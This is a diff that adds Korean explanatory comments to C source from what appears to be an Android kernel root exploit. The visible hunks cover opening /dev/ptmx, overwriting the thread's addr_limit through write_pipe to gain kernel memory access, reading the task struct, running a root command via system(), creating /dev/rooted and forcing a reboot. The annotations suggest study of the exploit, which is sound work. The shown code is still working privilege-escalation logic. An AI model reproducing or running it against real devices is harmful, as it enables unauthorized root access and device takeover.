@@ -216,11 +216,11 @@ void write_kernel(int signum)
 
         pthread_mutex_lock(is_kernel_writing);
 
-        HACKS_fdm = open("/dev/ptmx", O_RDWR);
+        HACKS_fdm = open("/dev/ptmx", O_RDWR); // /dev/ptmx(가상 터미널 master/slave 생성)
         unlockpt(HACKS_fdm);
-        slavename = (char *)ptsname(HACKS_fdm);
+        slavename = (char *)ptsname(HACKS_fdm); // slavename = 슬레이브 네임 얻기.
 
-        open(slavename, O_RDWR);
+        open(slavename, O_RDWR); // 슬레이브 오픈.
 
         do_splice_tid_read = 1;
         while (1) {
@@ -229,10 +229,11 @@ void write_kernel(int signum)
             }
         }
 
-        read(HACKS_fdm, readbuf, sizeof readbuf);
+        read(HACKS_fdm, readbuf, sizeof readbuf); // ptmx 버퍼 읽음.
 
         printf("addr_limit: %p\n", &HACKS_final_stack_base->addr_limit);
 
+		// new_addr_limit을 설정.
         write_pipe(&HACKS_final_stack_base->addr_limit, &new_addr_limit, sizeof new_addr_limit);
 
         pthread_mutex_unlock(is_kernel_writing);
@@ -248,6 +249,8 @@ void write_kernel(int signum)
 
     printf("hack.\n");
 
+	// HACKS_final_stack_base = stackbuf(스택 버퍼) 읽음.
+	// stackbuf.task = taskbuf를 읽음.
     read_pipe(HACKS_final_stack_base, &stackbuf, sizeof stackbuf);
     read_pipe(stackbuf.task, taskbuf, sizeof taskbuf);
 
@@ -340,12 +343,12 @@ void write_kernel(int signum)
     if (g_argc >= 2) {
         system(rootcmd);
     }
-    system("/system/bin/touch /dev/rooted");
+    system("/system/bin/touch /dev/rooted"); // /dev/rooted 디바이스 생성.
 
     pid = fork();
     if (pid == 0) {
         while (1) {
-            ret = access("/dev/rooted", F_OK);
+            ret = access("/dev/rooted", F_OK); // /dev/rooted 접근이 되면.(생성되었으면).
             if (ret >= 0) {
                 break;
             }
@@ -356,13 +359,14 @@ void write_kernel(int signum)
 
         printf("rebooting...\n");
         sleep(1);
-        system("reboot");
+        system("reboot"); // 리부팅.
 
         while (1) {
             sleep(10);
         }
     }
 
+	// 뮤텍스 락 해제.
     pthread_mutex_lock(&done_lock);
     pthread_cond_signal(&done);
     pthread_mutex_unlock(&done_lock);
